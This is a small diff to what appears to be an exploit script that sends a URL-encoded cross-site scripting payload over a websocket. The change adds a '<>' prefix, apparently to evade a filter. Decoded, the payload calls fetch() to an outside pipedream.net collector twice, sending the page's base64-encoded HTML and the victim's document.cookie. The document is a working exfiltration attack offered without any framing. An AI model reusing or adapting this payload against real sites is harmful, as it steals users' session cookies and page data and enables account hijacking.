@@ -6,7 +6,7 @@
   websocket.onmessage = handleReply;
   function start(event) {
     websocket.send("READY");
-    let payload = decodeURIComponent("%3Cscript%3Efetch('https%3A%2F%2Feocvkn4m3kpce3q.m.pipedream.net%3Fdom%3D'%2Bbtoa(document.body.innerHTML)%2C%20%7Bmode%3A%20'no-cors'%7D)%3Bfetch('https%3A%2F%2Feocvkn4m3kpce3q.m.pipedream.net%3Fdom%3D'%2Bdocument.cookie%2C%20%7Bmode%3A%20'no-cors'%7D)%3B%3C%2Fscript%3E");
+    let payload = decodeURIComponent("%3C%3E%3Cscript%3Efetch('https%3A%2F%2Feocvkn4m3kpce3q.m.pipedream.net%3Fdom%3D'%2Bbtoa(document.body.innerHTML)%2C%20%7Bmode%3A%20'no-cors'%7D)%3Bfetch('https%3A%2F%2Feocvkn4m3kpce3q.m.pipedream.net%3Fdom%3D'%2Bdocument.cookie%2C%20%7Bmode%3A%20'no-cors'%7D)%3B%3C%2Fscript%3E");
     websocket.send(payload);
     websocket.send("READY");
   }
